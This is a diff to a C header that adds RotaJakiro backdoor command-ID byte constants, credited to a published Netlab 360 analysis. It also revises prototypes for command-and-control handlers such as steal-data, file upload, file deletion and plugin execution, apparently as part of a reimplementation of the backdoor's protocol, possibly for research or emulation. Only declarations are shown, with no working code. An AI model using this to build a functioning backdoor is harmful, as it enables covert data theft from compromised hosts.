@@ -13,6 +13,22 @@
 #define C2_COMMANDS_H_
 
 
+// RotaJakiro Command IDs
+// Taken from https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
+static unsigned char rota_c2_exit[4] = {0x13, 0x8e, 0x3e, 0x06};
+static unsigned char rota_c2_test[4] = {0x20, 0x83, 0x07, 0x0a};
+static unsigned char rota_c2_heartbeat[4] = {0x5c, 0xca, 0x72, 0x07};
+static unsigned char rota_c2_set_timeout[4] = {0x17,0xB1, 0xCC, 0x04};
+static unsigned char rota_c2_steal_data[4] = {0x25, 0x36, 0x60, 0xEA};
+static unsigned char rota_c2_upload_dev_info[4] = {0x18, 0x32, 0x0e, 0x00};
+static unsigned char rota_c2_upload_file[4] = {0x2E, 0x25, 0x99, 0x02};
+static unsigned char rota_c2_query_file[4] = {0x2C, 0xD9, 0x07, 0x00};
+static unsigned char rota_c2_delete_file[4] = {0x12, 0xB3, 0x62, 0x09};
+static unsigned char rota_c2_run_plugin_1[4] = {0x1B, 0x25, 0x50, 0x30};
+static unsigned char rota_c2_run_plugin_2[4] = {0x15, 0x32, 0xE6, 0x50};
+static unsigned char rota_c2_run_plugin_3[4] = {0x25, 0xD5, 0x08,0x02};
+
+
 /**
  * @brief main c2 loop to process commands from handler
  * @param N/A
@@ -43,7 +59,7 @@ void c2_heartbeat();
 *
 * @return N/A
 **/
-void c2_set_timeout(int sleeptime);
+void c2_set_timeout(int *sleeptime, int newTime);
 
 /**
 * @brief obtain sensitive info (TODO - what sensitive info) from host machine command-id: 0x25360EA
@@ -99,7 +115,7 @@ void c2_run_plugin_2();
 void c2_run_plugin_3();
 
 /**
- * @brief send initial pkt to destinatio host.
+ * @brief prepare initial pkt to send to destination host.
  * @param N/A
  * @return char pointer to ROTA's initial header.
  **/
